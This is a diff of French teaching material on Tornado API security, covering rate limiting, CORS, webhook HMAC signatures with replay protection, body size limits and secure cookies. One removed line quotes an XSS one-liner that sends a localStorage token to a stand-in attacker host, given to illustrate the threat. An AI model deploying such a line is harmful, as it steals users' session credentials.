+            "autres usagers légitimes. L'ingénierie de la **limitation de débit (*Rate Limiting*)**, greffée dès le "
+            "crochet `prepare(self)` de Tornado et adossée au statut normalisé **`429 Too Many Requests` (RFC 6585)**, "
+            "érige une vanne de régulation mathématique qui garantit l'équité de service."
         ),
         "deep_sections": [
             {
-                "heading": "1. Comparaison des algorithmes industriels : Fixed Window vs Sliding Window Log vs Token Bucket",
+                "heading": "1. Algorithmique du contrôle d'admission : Fixed Window, Sliding Window Log (`collections.deque`) et Token Bucket",
                 "body": (
-                    "Il existe trois grandes familles d'algorithmes pour compter et réguler le trafic d'une API :\n"
-                    "1. **Fenêtre Fixe (*Fixed Window Counter*)** : On découpe le temps en tranches fixes (ex: `14h00-14h01`, `14h01-14h02`) avec un simple compteur. "
-                    "*Défaut majeur (Effet de bord aux frontières)* : Si la limite est de 100 req/min, un client peut envoyer 100 requêtes à `14h00m59s` "
-                    "et 100 autres à `14h01m01s`, soit **200 requêtes en 2 secondes**, doublant la charge autorisée !\n"
-                    "2. **Journal à Fenêtre Glissante (*Sliding Window Log* — implémenté dans notre laboratoire)** : Pour chaque client, on conserve "
-                    "la liste des horodatages exacts (`time.time()`) de ses requêtes récentes. Lorsqu'une nouvelle requête arrive à l'instant `T` dans `prepare(self)`, "
-                    "on purge toutes les entrées antérieures à `T - 20s`. Si le nombre d'entrées restantes atteint le quota, on rejette la requête via `self.finish(...)`. "
-                    "Cet algorithme est **mathématiquement exact** et élimine tout effet de pointe aux frontières de minutes.\n"
-                    "3. **Seau à Jetons (*Token Bucket* — utilisé par AWS API Gateway et NGINX)** : Chaque client possède un seau virtuel contenant au "
-                    "maximum `B` jetons (capacité de rafale / *burst*), qui se remplit à un rythme constant de `R` jetons par seconde."
+                    "Concevoir un limiteur de débit exige de choisir un compromis précis entre l'exactitude mathématique "
+                    "du lissage temporel et l'empreinte mémoire par client actif.\n\n"
+                    "#### Fenêtre fixe (*Fixed Window Counter*) et l'anomalie de rafale aux frontières\n\n"
+                    "L'approche la plus élémentaire consiste à indexer un compteur entier sur la minute courante "
+                    "(`int(time.time() // 60)`). Bien qu'elle ne consomme qu'un entier de 8 octets par client, elle "
+                    "souffre d'un défaut géométrique bien connu : pour un plafond nominal de 100 requêtes par minute, "
+                    "un client émettant 100 appels à `14:00:59.500` puis 100 autres à `14:01:00.100` respecte "
+                    "individuellement chacune des deux fenêtres civiles tout en infligeant à votre serveur Tornado une "
+                    "pointe réelle de **200 requêtes en 600 millisecondes**, soit le double exact de la capacité dimensionnée.\n\n"
+                    "#### Journal à fenêtre glissante (*Sliding Window Log*) en `O(1)` amorti\n\n"
+                    "L'algorithme implémenté dans notre laboratoire élimine tout artefact de frontière en conservant "
+                    "pour chaque clé cliente une file à double entrée `collections.deque` ordonnée chronologiquement "
+                    "des horodatages monotones (`time.monotonic()`) de ses requêtes acceptées. Lorsqu'une requête se "
+                    "présente à l'instant `T` pour une fenêtre glissante `W = 20.0` secondes, une boucle `while q and q[0] <= T - W: q.popleft()` "
+                    "évacue en tête de file les entrées périmées. Si `len(q)` atteint le plafond `MAX_REQ`, la requête "
+                    "est immédiatement rejetée sans être enregistrée. Chaque horodatage n'entrant et ne sortant de la "
+                    "`deque` qu'une seule fois, le coût algorithmique par requête est en temps constant **`O(1)` amorti**.\n\n"
+                    "#### Seau à jetons (*Token Bucket*) et tolérance contrôlée aux rafales (*Bursts*)\n\n"
+                    "Sur les passerelles industrielles à très grande échelle (Nginx `limit_req`, Envoy, AWS API Gateway), "
+                    "le modèle privilégié est le **Seau à Jetons** : chaque client dispose d'un réservoir virtuel de "
+                    "capacité maximale `B` (*burst*) qui se régénère continûment à la vitesse `R` jetons par seconde "
+                    "(`jetons = min(B, jetons + (T - T_prec) * R)`). Il ne requiert que deux nombres flottants par "
+                    "client en mémoire tout en autorisant une application Web qui charge simultanément quatre composants "
+                    "graphiques au démarrage à consommer une brève rafale légitime sans subir de faux positifs `429`."
                 )
             },
             {
-                "heading": "2. Les en-têtes HTTP de transparence : `X-RateLimit-*` et `Retry-After` (RFC 6585)",
+                "heading": "2. Contrat protocolaire RFC 6585 : `429 Too Many Requests`, `Retry-After` et court-circuit `prepare(self)`",
                 "body": (
-                    "Un bon limiteur de débit ne se contente pas de bloquer brutalement le client : il lui communique en permanence l'état "
-                    "de son quota dans les **en-têtes de réponse HTTP** via `self.set_header(...)` :\n"
-                    "- `X-RateLimit-Limit: 3` : Le plafond maximal autorisé sur la fenêtre temporelle.\n"
-                    "- `X-RateLimit-Remaining: 2` : Le nombre de requêtes qu'il reste au client avant blocage.\n"
-                    "- `Retry-After: 18` (Obligatoire sur une réponse `429 Too Many Requests`) : Indique exactement au script client combien de "
-                    "secondes il doit patienter (`time.sleep(18)`) avant de réessayer sa requête."
+                    "Rejeter un dépassement de cadence ne doit jamais ressembler à une panne serveur (`500`) ni à une "
+                    "révocation définitive de droits (`403`). La **RFC 6585 (Section 4)** consacre le code **`429 Too "
+                    "Many Requests`** à la signalisation explicite d'une contre-pression (*backpressure*) temporaire "
+                    "invitant le client coopératif à ralentir sa cadence d'émission.\n\n"
+                    "> « The 429 status code indicates that the user has sent too many requests in a given amount of time "
+                    "(\"rate limiting\"). The response representations SHOULD include details explaining the condition, "
+                    "and MAY include a Retry-After header indicating how long to wait before making a new request. » "
+                    "— IETF RFC 6585, Section 4 (Nottingham & Fielding, 2012)\n\n"
+                    "#### Interception précoce dans `prepare(self)` et observabilité des quotas\n\n"
+                    "Dans le cycle interne `RequestHandler._execute()` de Tornado, `prepare(self)` s'exécute **avant** "
+                    "l'invocation de `get()`, `post()` ou tout accès à la base de données. Appeler `self.set_status(429)` "
+                    "suivi de `self.finish(...)` à l'intérieur de `prepare(self)` positionne le drapeau interne "
+                    "`self._finished = True`, ce qui court-circuite instantanément le reste du cycle HTTP : la requête "
+                    "excédentaire est écartée en quelques microsecondes sans gaspiller ni CPU métier ni connexion SQL.\n\n"
+                    "```http — Réponse HTTP 429 auto-descriptive émise par Tornado\n"
+                    "HTTP/1.1 429 Too Many Requests\n"
+                    "Content-Type: application/problem+json; charset=UTF-8\n"
+                    "X-RateLimit-Limit: 3\n"
+                    "X-RateLimit-Remaining: 0\n"
+                    "X-RateLimit-Reset: 1763741218\n"
+                    "Retry-After: 14\n\n"
+                    "{\"type\": \"https://api.isgp.dz/erreurs/quota-depasse\", \"title\": \"Too Many Requests\", \"status\": 429, \"retry_after_seconds\": 14}\n"
+                    "```\n\n"
+                    "Avec `Sliding Window Log`, le délai exact de libération du prochain créneau se déduit algébriquement "
+                    "du plus ancien horodatage encore présent en tête de la file : "
+                    "`retry_after = max(1, math.ceil(W - (T - file_client[0])))`. Les SDK industriels (Stripe, OpenAI, "
+                    "boto3) lisent nativement cet en-tête `Retry-After` et suspendent leur coroutine exactement pendant "
+                    "la durée prescrite au lieu d'aggraver la congestion par des réessais aveugles immédiats."
                 )
             },
             {
-                "heading": "3. Quelle clé d'identification choisir dans Tornado ? (`self.request.remote_ip` vs `X-API-Key`)",
+                "heading": "3. Clé de partitionnement (`remote_ip` sous `xheaders=True` vs identité métier) et état distribué Redis",
                 "body": (
-                    "Identifier l'appelant pour appliquer le quota demande de la nuance :\n"
-                    "- **Sur les routes publiques non authentifiées (`/api/login`, `/api/catalogue`)** : On utilise l'adresse IP du client (`self.request.remote_ip`, "
-                    "automatiquement renseignée depuis `X-Forwarded-For` lorsque `HTTPServer(app, xheaders=True)` est placé derrière un proxy inverse Nginx).\n"
-                    "- **Sur les routes authentifiées** : Il est beaucoup plus juste et précis d'indexer le compteur sur l'identifiant du client authentifié "
-                    "(`X-API-Key` ou `sub` du jeton Bearer), ce qui permet d'offrir des quotas différenciés selon l'abonnement."
+                    "La pertinence d'un limiteur de débit dépend directement du discriminateur utilisé pour partitionner "
+                    "les compteurs. Sur les endpoints publics pré-authentification (`/api/v1/auth/login`, catalogue "
+                    "ouvert), le seul identifiant disponible est l'adresse réseau `self.request.remote_ip`. Toutefois, "
+                    "deux subtilités d'infrastructure majeures doivent être anticipées.\n\n"
+                    "#### Restitution de l'adresse IP réelle derrière Nginx et piège du NAT d'entreprise\n\n"
+                    "Dès que Tornado opère derrière un répartiteur Nginx local, la socket TCP provient de `127.0.0.1`. "
+                    "Omettre `xheaders=True` lors de l'instanciation de `tornado.httpserver.HTTPServer(app, xheaders=True)` "
+                    "ferait partager un **unique compteur global `127.0.0.1`** à l'ensemble de la planète ! De plus, "
+                    "même avec `xheaders=True`, trois cents étudiants d'un campus universitaire ou employés d'un ministère "
+                    "sortant derrière un même routeur NAT partagent la même IP publique. Dès qu'une route est authentifiée, "
+                    "indexez donc prioritairement vos quotas sur l'identifiant logique vérifié (`sub` du jeton Bearer ou "
+                    "empreinte de la `X-API-Key`), ce qui permet en outre d'appliquer des paliers tarifaires différenciés.\n\n"
+                    "> [!IMPORTANT] Du dictionnaire RAM mono-processus au script Lua atomique dans Redis\n"
+                    "> Un dictionnaire Python en mémoire vive est parfaitement cohérent au sein d'un processus Tornado "
+                    "unique (puisque l'`IOLoop` mono-thread exécute `prepare()` sans préemption concurrente entre deux "
+                    "lignes synchrones). En revanche, lorsque vous déployez 4 processus Tornado derrière Nginx en "
+                    "production, quatre dictionnaires RAM isolés laisseraient passer `4 * Quota` requêtes. En production "
+                    "multi-nœuds, déportez l'état de la fenêtre glissante dans **Redis** (`ZREMRANGEBYSCORE` + `ZCARD` + "
+                    "`ZADD` encapsulés dans un script `EVAL` Lua atomique interrogé en `async/await`), garantissant une "
+                    "comptabilité globale exacte à l'échelle de tout le cluster."
                 )
             }
         ],
@@ -523,8 +895,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Adaptez l'algorithme de Rate Limiting du chapitre pour appliquer un **quota différencié par niveau d'abonnement** : `5 requêtes/min` si l'en-tête `X-Plan` vaut `standard`, et `20 requêtes/min` s'il vaut `premium`.",
-            "Ajoutez un nettoyage périodique automatique des clés clientes inactives depuis plus de 60 secondes afin que le dictionnaire `HISTORIQUE_REQUETES` ne grossisse pas indéfiniment en mémoire."
+            "Faites évoluer le limiteur à fenêtre glissante basé sur `collections.deque` et `time.monotonic()` pour appliquer une politique de quotas différenciée selon le profil extrait d'un jeton signé : `5 requêtes / 60 s` pour le palier `standard` contre `30 requêtes / 60 s` pour le palier `entreprise`.",
+            "Enregistrez une tâche périodique non bloquante avec `tornado.ioloop.PeriodicCallback(purger_clients_inactifs, 60_000)` qui supprime du dictionnaire en mémoire toute entrée cliente dont la `deque` est vide après élagage, prévenant ainsi toute fuite graduelle de mémoire vive face à des millions d'adresses IP éphémères."
         ]
     },
 
@@ -533,54 +905,138 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d4-l6": {
         "context": (
-            "Pour compléter la sécurité périmétrique de notre API Tornado, nous abordons trois mécanismes que tout "
-            "architecte d'API rencontre dès la mise en production :\n"
-            "1. **La politique `CORS` (*Cross-Origin Resource Sharing*)** : Pourquoi votre API fonctionne-t-elle parfaitement "
-            "dans `curl` ou Postman, mais échoue immédiatement avec une erreur rouge dans la console dès qu'une application "
-            "React ou Vue.js tente de l'appeler depuis un navigateur Web ?\n"
-            "2. **La vérification cryptographique des `Webhooks` (`HMAC-SHA256`)** : Lorsqu'un prestataire de paiement (Stripe, "
-            "Chargily, PayPal) ou GitHub appelle votre API pour vous notifier d'un paiement réussi, comment être certain "
-            "à 100% que l'appel provient bien du partenaire et non d'un pirate qui simule un paiement ?\n"
-            "3. **La protection mémoire contre les charges géantes (`413 Payload Too Large`)** : Comment empêcher un client "
-            "d'envoyer un JSON géant qui sature la mémoire RAM du serveur ?"
+            "Lorsqu'une API Tornado quitte l'environnement contrôlé des tests en ligne de commande pour intégrer un "
+            "écosystème hétérogène d'entreprise, trois frontières périmétriques entrent immédiatement en jeu. "
+            "D'abord, une application frontale React servie sur `https://portail.isgp.dz` se voit brutalement interdire "
+            "par le navigateur la lecture des réponses de `https://api.isgp.dz` tant que le protocole de négociation "
+            "inter-origines **`CORS` (*Cross-Origin Resource Sharing*)** n'est pas rigoureusement implémenté.\n\n"
+            "Ensuite, l'intégration d'architectures événementielles asynchrones inverse les rôles : ce sont désormais "
+            "des plateformes externes (passerelles monétiques Chargily ou Stripe, forges GitLab, opérateurs SMS) qui "
+            "appellent vos endpoints publics de **Webhooks**, exigeant une preuve cryptographique `HMAC-SHA256` sur "
+            "les octets bruts du réseau pour déjouer les notifications falsifiées et le rejeu. Enfin, le serveur HTTP "
+            "doit borner strictement l'allocation des tampons d'entrée (`max_body_size` / **`413 Content Too Large`**) "
+            "afin qu'une charge utile disproportionnée ne puisse jamais provoquer un épuisement mémoire (*Out-Of-Memory*) "
+            "du processus Python."
         ),
         "deep_sections": [
             {
-                "heading": "1. Comprendre `CORS` (*Cross-Origin Resource Sharing*) et la méthode `def options(self)` dans Tornado",
+                "heading": "1. Mécanique navigateur de la *Same-Origin Policy* (`SOP`), négociation `CORS` et `def options(self)`",
                 "body": (
-                    "Par défaut, tous les navigateurs Web (Chrome, Firefox, Safari) appliquent une règle de sécurité stricte appelée "
-                    "**SOP (*Same-Origin Policy* / Politique de même origine)** : un script JavaScript exécuté sur le domaine "
-                    "`https://portail.isgp.dz` n'a le droit de lire les réponses d'une API que si elle est hébergée sur la **même origine** "
-                    "(même protocole + même domaine + même port).\n"
-                    "- Si votre frontal React tourne sur `http://localhost:3000` (ou `https://portail.isgp.dz`) et appelle votre API Tornado sur "
-                    "`http://localhost:8888` (ou `https://api.isgp.dz`), les origines diffèrent : le navigateur bloque la lecture de la réponse, "
-                    "**sauf si le `RequestHandler` Tornado inclut explicitement les en-têtes `Access-Control-Allow-Origin` dans `set_default_headers(self)`**.\n"
-                    "- **La requête de pré-vérification (`Preflight OPTIONS` -> `def options(self)`)** : Avant d'envoyer une requête `POST`, `PUT`, `DELETE` "
-                    "avec `Content-Type: application/json` ou `Authorization`, le navigateur envoie automatiquement une requête `OPTIONS` "
-                    "à laquelle Tornado répond `204 No Content` dans `def options(self)`."
+                    "Contrairement à une idée reçue tenace, **`CORS` n'est pas un pare-feu protégeant le serveur contre "
+                    "`curl`** (un script Python ou `curl` ignore totalement les en-têtes `CORS`). `CORS` (spécification "
+                    "WHATWG Fetch) est un **protocole d'assouplissement sélectif** de la **Politique de Même Origine "
+                    "(*Same-Origin Policy* — SOP)** imposée par les navigateurs Web pour protéger l'utilisateur final.\n\n"
+                    "#### Pourquoi la SOP existe et comment se définit une Origine (RFC 6454)\n\n"
+                    "Deux URLs ne partagent la même origine que si le triplet `(schéma, hôte, port)` concorde "
+                    "intégralement : `http://localhost:3000` et `http://localhost:8888` sont deux origines étrangères "
+                    "à cause du port, tout comme `https://portail.isgp.dz` et `https://api.isgp.dz` à cause du sous-domaine. "
+                    "Sans la SOP, une page malveillante ouverte dans un onglet voisin pourrait exécuter en arrière-plan "
+                    "`fetch('https://intranet-rh.entreprise.dz/bulletins')` et lire vos données confidentielles en "
+                    "profitant de la session active de votre navigateur.\n\n"
+                    "#### Le ballet protocolaire du *Preflight* `OPTIONS` dans Tornado\n\n"
+                    "Dès qu'un script JavaScript frontal tente d'émettre une requête « non simple » — typiquement une "
+                    "méthode mutatrice (`PUT`, `PATCH`, `DELETE`), un corps `Content-Type: application/json` ou un "
+                    "en-tête `Authorization: Bearer ...` — le moteur du navigateur suspend l'appel métier et émet "
+                    "automatiquement en éclaireur une requête de **pré-vérification (*Preflight*)** de verbe `OPTIONS` "
+                    "accompagnée des en-têtes `Origin` et `Access-Control-Request-Headers`.\n\n"
+                    "```python — Implémentation sécurisée du contrat CORS par liste blanche dans Tornado\n"
+                    "ORIGINES_AUTORISEES = frozenset({\"https://portail.isgp.dz\", \"http://localhost:3000\"})\n\n"
+                    "class BaseCORSHandler(tornado.web.RequestHandler):\n"
+                    "    def set_default_headers(self) -> None:\n"
+                    "        origine = self.request.headers.get(\"Origin\", \"\")\n"
+                    "        if origine in ORIGINES_AUTORISEES:\n"
+                    "            self.set_header(\"Access-Control-Allow-Origin\", origine)\n"
+                    "            self.set_header(\"Vary\", \"Origin\")\n"
+                    "            self.set_header(\"Access-Control-Allow-Credentials\", \"true\")\n"
+                    "            self.set_header(\"Access-Control-Allow-Methods\", \"GET, POST, PUT, PATCH, DELETE, OPTIONS\")\n"
+                    "            self.set_header(\"Access-Control-Allow-Headers\", \"Content-Type, Authorization, X-API-Key\")\n"
+                    "            self.set_header(\"Access-Control-Max-Age\", \"600\")\n\n"
+                    "    def options(self, *args, **kwargs) -> None:\n"
+                    "        self.set_status(204)\n"
+                    "        self.finish()\n"
+                    "```\n\n"
+                    "> [!IMPORTANT] Rôle critique de l'en-tête `Vary: Origin`\n"
+                    "> Lorsque `Access-Control-Allow-Origin` reflète dynamiquement une origine issue d'une liste blanche "
+                    "(au lieu d'une valeur statique), vous devez impérativement émettre `Vary: Origin`. Sans cet "
+                    "indicateur, un cache intermédiaire CDN ou proxy d'entreprise pourrait mémoriser la réponse servie "
+                    "à `https://portail.isgp.dz` et la rejouer avec le mauvais en-tête `Access-Control-Allow-Origin` à "
+                    "une autre application autorisée, provoquant des pannes CORS intermittentes redoutables à diagnostiquer."
                 )
             },
             {
-                "heading": "2. Architecture inversée (`Webhooks`) et signature `HMAC-SHA256` sur octets bruts (`self.request.body`)",
+                "heading": "2. Authentification des Webhooks entrants : `HMAC-SHA256` sur `self.request.body` et anti-rejeu",
                 "body": (
-                    "Au lieu que votre serveur interroge une API externe toutes les 5 secondes pour savoir si un étudiant a payé ses frais "
-                    "d'inscription (*Polling* inefficace), le prestataire de paiement envoie lui-même une requête `POST /api/webhooks/paiement` "
-                    "à votre serveur dès que la transaction aboutit : c'est un **Webhook** (un rappel HTTP serveur-à-serveur).\n"
-                    "- **Le risque** : L'URL `/api/webhooks/paiement` étant accessible sur Internet, n'importe qui pourrait envoyer "
-                    "`{\"evenement\": \"paiement.reussi\", \"montant\": 50000}` avec `curl` pour valider frauduleusement sa commande.\n"
-                    "- **La parade industrielle (`X-Webhook-Signature`)** : Vous partagez un secret unique (`WEBHOOK_SECRET`) avec le prestataire. "
-                    "Avant d'envoyer le JSON, le prestataire calcule le `HMAC-SHA256` des **octets bruts exacts** du corps HTTP avec ce secret et "
-                    "l'inscrit dans l'en-tête `X-Webhook-Signature`.\n"
-                    "- **Règle d'or dans Tornado** : Vous devez calculer le HMAC sur **`self.request.body`** (les octets bruts `bytes` tels qu'ils ont circulé "
-                    "sur le réseau) et **JAMAIS** sur un dictionnaire re-sérialisé par `json.dumps()`."
+                    "Dans une architecture pilotée par événements (*Event-Driven Architecture*), remplacer le scrutage "
+                    "périodique (*polling*) par un **Webhook** élimine 99 % du trafic réseau inutile : dès qu'un virement "
+                    "d'inscription est confirmé, le serveur du prestataire monétique émet une requête `POST` vers votre "
+                    "endpoint Tornado `/api/v1/webhooks/paiement`. Parce que cet endpoint doit être joignable par un "
+                    "serveur externe sur Internet, sa sécurité repose intégralement sur la **vérification d'une signature "
+                    "`HMAC-SHA256` calculée avec un secret partagé (`WEBHOOK_SECRET`)**.\n\n"
+                    "#### Pourquoi re-sérialiser le JSON brise irrémédiablement la vérification HMAC\n\n"
+                    "La fonction de hachage `SHA-256` opère sur une **séquence exacte d'octets (`bytes`)**, et non sur "
+                    "une équivalence sémantique d'objets JSON. Les deux séquences `b'{\"id\":1,\"ok\":true}'` et "
+                    "`b'{\"ok\": true, \"id\": 1}'` représentent le même dictionnaire Python après `json.loads()`, mais "
+                    "leurs condensats `HMAC-SHA256` n'ont aucun bit en commun. Dans Tornado, vous devez donc calculer "
+                    "le `HMAC` directement sur **`self.request.body`** (les octets bruts lus sur la socket TCP par "
+                    "`HTTP1Connection`) **avant** tout appel à `tornado.escape.json_decode()`.\n\n"
+                    "#### Protection contre les attaques par rejeu (*Replay Attacks*) par liaison temporelle\n\n"
+                    "Une signature valide sur le seul corps HTTP reste vulnérable au rejeu : si un attaquant capture un "
+                    "Webhook légitime créditant un portefeuille de 10 000 DZD et le renvoie cinquante fois, la signature "
+                    "demeure mathématiquement exacte ! Le standard industriel popularisé par Stripe lie donc l'horodatage "
+                    "au message signé (`message_signe = timestamp_bytes + b\".\" + self.request.body`), rejette tout "
+                    "écart horaire supérieur à 300 secondes (`abs(time.time() - int(ts)) > 300`), et mémorise l'`event_id` "
+                    "traité pour garantir l'**idempotence**.\n\n"
+                    "```python — Validation cryptographique complète d'un Webhook avec fenêtre anti-rejeu\n"
+                    "import hashlib, hmac, time\n"
+                    "import tornado.escape, tornado.web\n\n"
+                    "EVENEMENTS_TRAITES: set[str] = set()\n\n"
+                    "class PaiementWebhookHandler(tornado.web.RequestHandler):\n"
+                    "    def post(self) -> None:\n"
+                    "        ts_str = self.request.headers.get(\"X-Webhook-Timestamp\", \"\")\n"
+                    "        sig_recue = self.request.headers.get(\"X-Webhook-Signature\", \"\")\n"
+                    "        if not ts_str.isdigit() or abs(time.time() - int(ts_str)) > 300:\n"
+                    "            self.set_status(401)\n"
+                    "            self.finish({\"erreur\": \"Horodatage Webhook absent ou hors fenetre de tolerance (300s)\"})\n"
+                    "            return\n"
+                    "        secret = self.settings[\"webhook_secret\"].encode(\"utf-8\")\n"
+                    "        charge_signee = ts_str.encode(\"ascii\") + b\".\" + self.request.body\n"
+                    "        sig_attendue = \"sha256=\" + hmac.new(secret, charge_signee, hashlib.sha256).hexdigest()\n"
+                    "        if not hmac.compare_digest(sig_recue, sig_attendue):\n"
+                    "            self.set_status(401)\n"
+                    "            self.finish({\"erreur\": \"Signature cryptographique Webhook invalide\"})\n"
+                    "            return\n"
+                    "        evenement = tornado.escape.json_decode(self.request.body)\n"
+                    "        if evenement[\"event_id\"] in EVENEMENTS_TRAITES:\n"
+                    "            self.write({\"statut\": \"deja_traite_idempotent\"})\n"
+                    "            return\n"
+                    "        EVENEMENTS_TRAITES.add(evenement[\"event_id\"])\n"
+                    "        self.write({\"statut\": \"accepte\"})\n"
+                    "```"
                 )
             },
             {
-                "heading": "3. Protection de la mémoire vive contre les charges géantes (`413 Payload Too Large` / `max_body_size`)",
+                "heading": "3. Défense mémoire des tampons réseau Tornado : `max_body_size`, `max_buffer_size` et statut `413`",
                 "body": (
-                    "Lorsque Tornado lit une requête HTTP, il charge le corps de la requête dans `self.request.body`.\n"
-                    "- En configurant `max_body_size` sur `tornado.httpserver.HTTPServer` et en vérifiant `len(self.request.body) > TAILLE_MAX_OCTETS` "
-                    "dans `prepare(self)`, vous interrompez immédiatement le traitement avec **`413 Payload Too Large`** avant toute désérialisation coûteuse."
+                    "Dans le modèle par défaut de Tornado, le parseur bas niveau `tornado.http1connection.HTTP1Connection` "
+                    "accumule l'intégralité des octets du corps de la requête entrante dans un tampon en mémoire vive "
+                    "(`IOStream`) avant d'instancier le `RequestHandler` et d'exposer le résultat sous `self.request.body`. "
+                    "Cette conception garantit que `prepare()` et `post()` accèdent au corps sans `await`, mais crée un "
+                    "vecteur évident d'épuisement de RAM si aucune borne stricte n'est imposée.\n\n"
+                    "#### Double ligne de défense : plafond global `HTTPServer` et plafond granulaire métier\n\n"
+                    "Au niveau transport, `tornado.httpserver.HTTPServer` applique par défaut une limite globale "
+                    "`max_body_size` de 100 Mo — une valeur adaptée au téléversement de fichiers mais beaucoup trop "
+                    "permissive pour une API JSON pure où une charge légitime dépasse rarement 64 Ko : vingt connexions "
+                    "malveillantes poussant chacune 95 Mo d'accolades JSON imbriquées suffiraient à engloutir près de "
+                    "2 Go de RAM et à déclencher le tueur de processus Linux (*OOM Killer*).\n\n"
+                    "> [!TIP] Configuration industrielle de `max_body_size` et `@stream_request_body`\n"
+                    "> Pour une API REST JSON, abaissez le plafond global dès l'instanciation du serveur via "
+                    "`HTTPServer(app, xheaders=True, max_body_size=1_048_576)` (1 Mo) et affinez par route sensible dans "
+                    "`prepare(self)` en renvoyant **`413 Content Too Large`** (dénomination actualisée de `413 Payload "
+                    "Too Large` dans la RFC 9110, Section 15.5.14) dès que `len(self.request.body)` excède le budget de "
+                    "l'endpoint (par exemple 16 Ko sur `/login`). Si une route spécifique doit accepter des archives PDF "
+                    "ou vidéo de plusieurs centaines de mégaoctets, décorez uniquement sa classe avec "
+                    "`@tornado.web.stream_request_body` pour traiter les fragments au fil de l'eau dans "
+                    "`data_received(self, chunk)` sans jamais les accumuler en mémoire vive."
                 )
             }
         ],
@@ -620,8 +1076,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez `day_4/05_cors_webhooks_headers.py` pour observer le pré-vol CORS (`OPTIONS`), la validation HMAC d'un Webhook et le rejet `413 Payload Too Large`.",
-            "Ajoutez la protection contre les **attaques par rejeu (*Replay Attacks*)** sur le Webhook : exigez un en-tête `X-Webhook-Timestamp`, incluez-le dans le calcul HMAC (`timestamp + \".\" + body`), et rejetez tout Webhook dont l'horodatage a plus de 5 minutes d'écart avec l'heure actuelle."
+            "Exécutez le module `day_4/05_cors_webhooks_headers.py` et inspectez successivement les en-têtes d'un pré-vol `OPTIONS` accepté, la vérification `HMAC-SHA256` sur octets bruts et l'interception `413` sur dépassement de charge.",
+            "Implémentez la défense complète contre les **attaques par rejeu (*Replay Attacks*)** en couplant l'en-tête `X-Webhook-Timestamp` à `self.request.body` dans le calcul `HMAC`, puis démontrez par un test unitaire qu'un Webhook authentique capturé il y a 10 minutes est systématiquement rejeté."
         ]
     },
 
@@ -630,56 +1086,82 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d4-l7": {
         "context": (
-            "Dans une architecture Web et API moderne, une question de sécurité critique revient dans chaque audit : "
-            "**où le navigateur doit-il conserver le jeton d'accès ou l'identifiant de session de l'utilisateur ?**\n"
-            "Pendant longtemps, de nombreux tutoriels conseillaient de stocker le JWT dans `window.localStorage` en JavaScript. "
-            "Or, l'OWASP déconseille formellement `localStorage` pour les secrets sensibles : à la moindre faille **XSS (*Cross-Site Scripting*)**, "
-            "une seule ligne de JavaScript injectée (`fetch('https://pirate.com?t=' + localStorage.getItem('token'))`) vole instantanément "
-            "les jetons de tous les utilisateurs connectés.\n"
-            "Ce chapitre enseigne l'ingénierie industrielle des **Cookies HTTP sécurisés (`Set-Cookie` / `Cookie`)**, des **Cookies Signés "
-            "Horodatés natifs de Tornado (`self.set_secure_cookie` / `self.get_secure_cookie` avec `cookie_secret`)** et des trois drapeaux de "
-            "défense périmétrique : **`HttpOnly`**, **`Secure`** et **`SameSite`**."
+            "Lorsqu'une application Web s'exécute dans un navigateur, une question d'architecture cruciale surgit lors "
+            "de chaque revue de sécurité : dans quel espace mémoire du client faut-il conserver le titre de session ou "
+            "le jeton d'accès de l'utilisateur ? De nombreux didacticiels grand public persistent à conseiller "
+            "`window.localStorage`. Or, le référentiel OWASP proscrit formellement `localStorage` et `sessionStorage` "
+            "pour tout secret d'authentification : à la moindre injection **XSS (*Cross-Site Scripting*)** dans un "
+            "composant graphique ou une bibliothèque NPM tierce, une unique instruction JavaScript lit l'intégralité "
+            "de `localStorage` et exfiltre silencieusement les jetons de tous les visiteurs.\n\n"
+            "Tornado résout nativement ce dilemme grâce à une implémentation cryptographique exemplaire des **Cookies "
+            "HTTP (RFC 6265)** : le mécanisme de cookies signés et horodatés v2 (`self.set_secure_cookie` et "
+            "`self.get_secure_cookie` adossés à `cookie_secret`), verrouillé au niveau du moteur réseau du navigateur "
+            "par le triptyque défensif **`HttpOnly`**, **`Secure`** et **`SameSite`**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Anatomie du cycle `Set-Cookie` (Serveur -> Client) et `Cookie` (Client -> Serveur) dans Tornado",
+                "heading": "1. Protocole d'état HTTP (RFC 6265) : cycle `Set-Cookie`, transport automatique `Cookie` et `clear_cookie`",
                 "body": (
-                    "Contrairement à l'en-tête `Authorization: Bearer ...` que le code JavaScript doit ajouter manuellement sur chaque `fetch()`, "
-                    "les **Cookies HTTP (RFC 6265)** sont gérés automatiquement par le moteur réseau du navigateur :\n"
-                    "1. **Émission (`Set-Cookie`)** : Lors de la réponse à `POST /api/auth/cookie-login`, le `RequestHandler` Tornado appelle "
-                    "`self.set_secure_cookie(\"isgp_session\", valeur, expires_days=1, httponly=True, secure=True, samesite=\"Strict\")`.\n"
-                    "2. **Transport automatique (`Cookie`)** : À chaque requête suivante vers ce domaine, le navigateur joint automatiquement "
-                    "l'en-tête `Cookie: isgp_session=...; isgp_theme=sombre`. Côté Tornado, on les lit avec **`self.get_secure_cookie(\"isgp_session\")`** et **`self.get_cookie(\"isgp_theme\")`**.\n"
-                    "3. **Révocation (`clear_cookie`)** : Lors du `POST /api/auth/cookie-logout`, `self.clear_cookie(\"isgp_session\")` "
-                    "émet un en-tête `Set-Cookie` avec une date d'expiration dans le passé, ordonnant au navigateur de détruire immédiatement le cookie."
+                    "Contrairement à l'en-tête `Authorization: Bearer` que le code applicatif JavaScript doit lire en "
+                    "mémoire et injecter manuellement sur chaque appel `fetch()`, le sous-système de cookies est géré "
+                    "directement par la pile réseau native C++ du navigateur, en dehors du moteur d'exécution JavaScript.\n\n"
+                    "#### Émission serveur, persistance isolée et destruction explicite\n\n"
+                    "À l'issue d'une authentification valide sur `POST /api/v1/auth/cookie-login`, le `RequestHandler` "
+                    "invoque `self.set_secure_cookie(\"isgp_session\", charge_json, expires_days=1, httponly=True, "
+                    "secure=True, samesite=\"Strict\")`, ce qui ajoute un en-tête `Set-Cookie` à la réponse HTTP. "
+                    "Sur toutes les requêtes ultérieures ciblant le même domaine et un chemin compatible, le navigateur "
+                    "attache automatiquement l'en-tête `Cookie: isgp_session=...`, que Tornado décode et vérifie via "
+                    "`self.get_secure_cookie(\"isgp_session\", max_age_days=1)`. Enfin, lors de la déconnexion, "
